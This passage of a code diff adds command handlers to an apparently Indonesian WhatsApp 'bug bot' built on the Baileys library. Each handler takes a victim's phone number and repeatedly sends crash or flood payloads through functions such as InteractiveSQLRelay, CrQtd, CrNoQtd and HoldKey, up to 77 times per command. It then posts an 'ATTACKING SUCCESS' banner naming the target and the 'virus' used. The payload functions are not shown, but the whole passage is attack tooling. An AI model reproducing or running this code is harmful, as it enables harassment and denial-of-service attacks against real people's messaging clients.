+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flodcr ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'flodcr': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 10; i++) {
+						await InteractiveSQLRelay(X, CrSql)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'cursorsql': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorSql Number_\n_Example : CursorSql 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await InteractiveSQLRelay(X, CrSql)
+						await InteractiveSQLRelay(X, CrSqlF)
+						await InteractiveSQLRelay(X, CrSql)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flodsql ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'flodsql': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorSql Number_\n_Example : CursorSql 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 10; i++) {
+						await InteractiveSQLRelay(X, CrSql)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'msgflow': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : MsgFlow Number_\n_Example : MsgFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await CrNoQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗙𝗹𝗼𝘄`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"flowfold ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'flowfold': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : MsgFlow Number_\n_Example : MsgFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 77; i++) {
+						await CrNoQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗙𝗹𝗼𝘄`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'msgpayload': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : MsgPayload Number_\n_Example : MsgPayload 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await CrQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗗𝗲𝘅`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Payflod ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'payflod': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : MsgPayload Number_\n_Example : MsgPayload 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 77; i++) {
+						await CrQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗗𝗲𝘅`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'fluxa': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await HoldKey(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗣𝗹𝗮𝗰𝗲𝗛𝗼𝗹𝗱𝗲𝗿 𝗞𝗲𝘆`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'cursorxflow': {
+				if (!isCreator) return m.reply(mess.owner)
